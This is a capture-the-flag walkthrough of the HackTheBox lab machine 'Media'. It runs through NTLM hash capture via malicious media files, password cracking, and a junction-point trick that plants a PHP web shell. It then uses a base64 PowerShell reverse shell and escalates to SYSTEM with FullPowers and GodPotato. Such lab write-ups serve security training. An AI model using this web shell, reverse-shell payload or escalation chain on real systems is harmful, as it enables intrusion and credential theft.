---
icon: photo-film
---

# HTB-MEDIA (VL)

<figure><img src="../../../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Nmap Scan Results

```bash
nmap -sC -sV -oA media 10.129.234.67
```

**Output:**

```
Nmap scan report for 10.129.234.67
Host is up (0.029s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

**Key Findings:**

* SSH on port 22 (Windows OpenSSH)
* HTTP server on port 80 (Apache with PHP)
* RDP on port 3389
* Windows Server environment

***

### Initial Access

#### Web Application Analysis

Navigating to `http://10.129.234.67` reveals a file upload functionality for video files.

**Application Details:**

* Upload function accepts Windows Media Player files (.wms format)
* PHP-based web application
* File upload processing mechanism

#### NTLM Hash Capture Attack

**Step 1: Clone ntlm\_theft Repository**

```bash
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
```

**Step 2: Generate Malicious Media Files**

```bash
python3 ntlm_theft.py --generate all --server 10.10.14.160 --filename video
```

This generates multiple file formats including:

* video.wax
* video.asx
* video.wmx

**Step 3: Start Responder**

```bash
responder -I tun0
```

**Step 4: Upload Malicious File**

* Navigate to the upload form
* Select "All Files" in file type
* Upload `video.wax`
* Submit the form

**Step 5: Capture NTLM Hash** Responder captures the following hash:

```
[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:1234567890abcdef:hash_value_here
```

**Step 6: Crack the Hash**

```bash
# Save hash to file
echo "enox::MEDIA:1234567890abcdef:hash_value_here" > enox.hash

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt enox.hash
```

**Cracked Password:** `1234virus@`

***

### User Flag

#### SSH Access

```bash
ssh enox@10.129.234.67
# Password: 1234virus@
```

**Connection established successfully**

#### Retrieve User Flag

```bash
type C:\Users\enox\Desktop\user.txt
```

***

### Lateral Movement

#### File System Analysis

**Key Discovery - index.php Analysis:** Located at `C:\xampp\htdocs\index.php`

The upload script generates MD5 hashes from form fields (firstname, lastname, email) and creates directories at:

```
C:\Windows\Tasks\Uploads\<md5_hash>
```

**Key Discovery - review.ps1 Analysis:** Located in enox's Documents folder

```powershell
while($True){
    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60
    }
    else {
        $result = Get-Values -FilePath $todofile
        $filename = $result.FileName
        $randomVariable = $result.RandomVariable
        
        # Opening the File in Windows Media Player
        Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"
        
        # Wait for 15 seconds
        Start-Sleep -Seconds 15
        
        # Kill media player process
        $mediaPlayerProcess = Get-Process -Name "wmplayer" -ErrorAction SilentlyContinue
        if ($mediaPlayerProcess -ne $null) {
            Write-Host "Killing Windows Media Player process."
            Stop-Process -Name "wmplayer" -Force
        }
        
        UpdateTodo -FilePath $todofile
        Sleep 15
    }
}
```

#### Junction Point Attack

**Step 1: Create Webshell**

```php
<!-- simplebackdoor.php -->
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**Step 2: Calculate Empty Form MD5** Empty form fields generate MD5 hash: `d41d8cd98f00b204e9800998ecf8427e`

**Step 3: Remove Existing Directory**

```cmd
rmdir /s /q d41d8cd98f00b204e9800998ecf8427e
```

**Step 4: Create Junction Link**

```cmd
cmd /c mklink /J C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e C:\xampp\htdocs
```

**Step 5: Upload Webshell** Upload `simplebackdoor.php` through the web form with empty fields.

**Step 6: Verify Webshell**

```bash
curl http://10.129.234.67/simplebackdoor.php?cmd=whoami
```

**Output:**

```
nt authority\local service
```

#### Reverse Shell

**Step 1: Generate PowerShell Payload** Using revshells.com - PowerShell #3 (Base64):

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAb...
```

**Step 2: Start Netcat Listener**

```bash
rlwrap -cAr nc -lvnp 4444
```

**Step 3: Execute Reverse Shell**

```bash
curl http://10.129.234.67/simplebackdoor.php --data-urlencode 'cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAb...'
```

**Connection received as:** `nt authority\local service`

***

### Privilege Escalation

#### Privilege Analysis

```cmd
whoami /priv
```

**Issue:** SeImpersonatePrivilege not present on local service account.

#### FullPowers Attack

**Step 1: Download FullPowers**

```bash
wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
```

**Step 2: Upload to Target**

```bash
sshpass -p '1234virus@' scp FullPowers.exe enox@10.129.234.67:/programdata/
```

**Step 3: Execute FullPowers**

```cmd
cd C:\programdata
.\FullPowers.exe -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAb...'
```

**Step 4: Verify Restored Privileges**

```cmd
whoami /priv
```

**Result:** SeImpersonatePrivilege successfully restored.

#### GodPotato Exploitation

**Step 1: Download GodPotato**

```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

**Step 2: Upload to Target**

```bash
sshpass -p '1234virus@' scp GodPotato-NET4.exe enox@10.129.234.67:/programdata/gp.exe
```

**Step 3: Execute GodPotato**

```bash
rlwrap -cAr nc -lnvp 4444
```

```cmd
cd C:\programdata
.\gp.exe -cmd 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAb...'
```

**Result:** Shell received as `nt authority\system`

***

### Root Flag

#### Retrieve Administrator Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag captured successfully**

***

Attack Chain Overview

1. **Initial Reconnaissance**
   * Nmap scan revealed Windows server with SSH, HTTP, and RDP services
   * Web application with file upload functionality identified
2. **NTLM Hash Capture**
   * Created malicious .wax file using ntlm\_theft
   * Triggered NTLM authentication via Windows Media Player
   * Captured and cracked NTLMv2 hash for user 'enox'
3. **User Access**
   * SSH login with cracked credentials (enox:1234virus@)
   * Retrieved user flag from desktop
4. **Web Shell Deployment**
   * Analyzed upload mechanism and automation script (review.ps1)
   * Exploited MD5 directory creation with junction point attack
   * Redirected uploads to web root directory
   * Deployed PHP webshell for command execution
5. **Privilege Escalation Chain**
   * Gained access as 'nt authority\local service'
   * Used FullPowers.exe to restore SeImpersonatePrivilege
   * Executed GodPotato.exe for final escalation to SYSTEM
   * Retrieved administrator flag

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
